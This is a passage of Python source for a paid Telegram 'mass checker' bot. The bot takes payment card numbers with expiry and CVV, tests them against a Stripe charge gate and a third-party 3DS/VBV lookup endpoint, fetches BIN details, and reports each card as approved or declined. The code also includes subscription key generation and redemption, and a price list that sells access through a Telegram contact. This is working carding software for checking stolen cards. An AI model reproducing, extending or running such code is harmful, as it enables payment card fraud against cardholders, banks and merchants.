Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>! 𝘚𝘛𝘙𝘐𝘗𝘌 𝘊𝘏𝘈𝘙𝘎𝘌  🟢
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : 𝘚𝘛𝘙𝘐𝘗𝘌 𝘊𝘏𝘈𝘙𝘎𝘌 
－－－－－－－－－－－－－－－－			
𝘊𝘊 : <code>{cc}</code>
𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 : 𝘚𝘛𝘙𝘐𝘗𝘌 𝘊𝘏𝘈𝘙𝘎𝘌  ✅
⚆ 𝘐𝘕𝘍𝘖 : <code>{card_type} - {brand}</code>
⚆ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 : <code>{country} - {country_flag} </code>
⚆ 𝘉𝘪𝘯 : <code>{cc[:6]}</code>
－－－－－－－－－－－－－－－－
⌧ 𝘐𝘴𝘴𝘶𝘦𝘳 : <code>{bank}</code>
⌧ 𝘛𝘪𝘮𝘦 : <code>{"{:.1f}".format(execution_time)}</code>
⌧ 𝘉𝘰𝘵 𝘉𝘺 : @FNxELECTRA</b>'''
	msgd=f'''<b>! 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦 𝘈𝘜𝘛𝘏 🔴
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦 𝘈𝘜𝘛𝘏
－－－－－－－－－－－－－－－－			
𝘊𝘊 : <code>{cc}</code>
𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 : Declined ❌
⚆ 𝘐𝘕𝘍𝘖 : <code>{card_type} - {brand}</code>
⚆ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 : <code>{country} - {country_flag} </code>
⚆ 𝘉𝘪𝘯 : <code>{cc[:6]}</code>
－－－－－－－－－－－－－－－－
⌧ 𝘐𝘴𝘴𝘶𝘦𝘳 : <code>{bank}</code>
⌧ 𝘛𝘪𝘮𝘦 : <code>{"{:.1f}".format(execution_time)}</code>
⌧ 𝘉𝘰𝘵 𝘉𝘺 : @FNxELECTRA</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>Fɴ Mᴀss Cʜᴇᴄᴋᴇʀ Sᴜsᴄʀɪᴘᴛɪᴏɴs Exᴘɪʀᴇ Iɴ ➜ {timer}
𝗧𝗬𝗣 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='TAITAN-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
		
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>{pas}</code>
		
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def respond_to_vbv(message):
	id=message.from_user.id
	name = message.from_user.first_name
	gate='3𝑫𝑺 𝑳𝒐𝒐𝒌𝒖𝒑'
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	try:BL=(json_data[str(id)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		BL='𝗙𝗥𝗘𝗘'
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/FNxELECTRA")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name} 𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫 🌿
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━(𝐏𝐑𝐈𝐂𝐄 🤝)━━━━━━━━
┃𝟏 𝐃𝐚𝐲 𝐑𝐬 𝟓𝟎
┃𝟓 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎
┃𝟏𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟓𝟎𝟎
┃𝟑𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎𝟎
┃━━━━━━━━/━━━━━━━━⍟
┃𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┗━━━━━━━━/━━━━━━━━⍟</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/FNxELECTRA")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>┏━━━━━━━━━━━━━━━━━⍟   
┃𝐇𝐞𝐲 {name} 𝐘𝐨𝐮 𝐀𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐔𝐬𝐞𝐫 🌿
┃𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭
┃━━━━━━━━(𝐏𝐑𝐈𝐂𝐄 🤝)━━━━━━━━
┃𝟏 𝐃𝐚𝐲 𝐑𝐬 𝟓𝟎
┃𝟓 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎
┃𝟏𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟓𝟎𝟎
┃𝟑𝟎 𝐃𝐚𝐲𝐬 𝐑𝐬 𝟏𝟎𝟎𝟎
┃━━━━━━━━/━━━━━━━━⍟
┃𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 <a href='t.me/FNxELECTRA'>𓆰𝅃꯭᳚⚡!! ⏤͟͟͞͞𝐅ɴ x EʟᴇᴄᴛʀᴀOᴘ𓆪𓆪⏤͟͞➤⃟🔥✘</a>
┗━━━━━━━━/━━━━━━━━⍟</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="⚆ 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐞𝐫 -ᴄɴ", url="https://t.me/FNxELECTRA")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪 𝘾𝙖𝙣𝙣𝙤𝙩 𝙐𝙨𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝘽𝙚𝙘𝙖𝙪𝙨𝙚 𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	ko = (bot.reply_to(message, "Cʜᴇᴄᴋɪɴɢ Yᴏᴜʀ Cᴀʀᴅs...⌛").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		response = requests.post(
		f'https://rimuruchkbot.alwaysdata.net/vbv.php?bin={cc}')
		last=(response.json()['result'])
		if 'result not found' in last:
			last='Authenticate Frictionless Failed'
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>!! 𝘛𝘳𝘢𝘯𝘴𝘢𝘤𝘵𝘪𝘰𝘯: 🟢
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : 𝘚𝘩𝘰𝘱𝘪𝘧𝘺🔸𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦
－－－－－－－－－－－－－－－－			
𝘊𝘊 : <code>{cc}</code>
𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 : APPROVED ✅
⚆ 𝘐𝘕𝘍𝘖 : <code>{card_type} - {brand}</code>
⚆ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 : <code>{country} - {country_flag} </code>
⚆ 𝘉𝘪𝘯 : <code>{cc[:6]}</code>
－－－－－－－－－－－－－－－－
⌧ 𝘐𝘴𝘴𝘶𝘦𝘳 : <code>{bank}</code>
⌧ 𝘛𝘪𝘮𝘦 : <code>{"{:.1f}".format(execution_time)}</code>
⌧ 𝘉𝘰𝘵 𝘉𝘺 : @FNxELECTRA</b>'''
	msgd=f'''<b>! 𝘛𝘳𝘢𝘯𝘴𝘢𝘤𝘵𝘪𝘰𝘯: 🔴
𝘎𝘢𝘵𝘦𝘸𝘢𝘺 : 𝘚𝘩𝘰𝘱𝘪𝘧𝘺🔸𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦
－－－－－－－－－－－－－－－－			
𝘊𝘊 : <code>{cc}</code>
𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 : Declined ❌
⚆ 𝘐𝘕𝘍𝘖 : <code>{card_type} - {brand}</code>
⚆ 𝘊𝘰𝘶𝘯𝘵𝘳𝘺 : <code>{country} - {country_flag} </code>
⚆ 𝘉𝘪𝘯 : <code>{cc[:6]}</code>
－－－－－－－－－－－－－－－－
⌧ 𝘐𝘴𝘴𝘶𝘦𝘳 : <code>{bank}</code>
⌧ 𝘛𝘪𝘮𝘦 : <code>{"{:.1f}".format(execution_time)}</code>
⌧ 𝘉𝘰𝘵 𝘉𝘺 : @FNxELECTRA</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("Fɴ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 𝐰𝐚𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 🫧")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"Fɴ 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 𝐰𝐚𝐬 ❌{e}")
